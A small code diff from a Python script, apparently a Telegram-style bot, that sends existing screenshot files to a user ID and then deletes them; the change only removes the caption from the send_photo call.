@@ -132,7 +132,7 @@ def main():
         screenshot_path = os.path.join(screenshot_directory, screenshot_file)
     
         if os.path.exists(screenshot_path):  # Check if the screenshot file exists
-           app.send_photo(user_id, photo=screenshot_path, caption=screenshot_path, progress=progress)
+           app.send_photo(user_id, photo=screenshot_path, progress=progress)
            os.remove(screenshot_path)
            print("Screenshot sent and deleted:", screenshot_file)
         
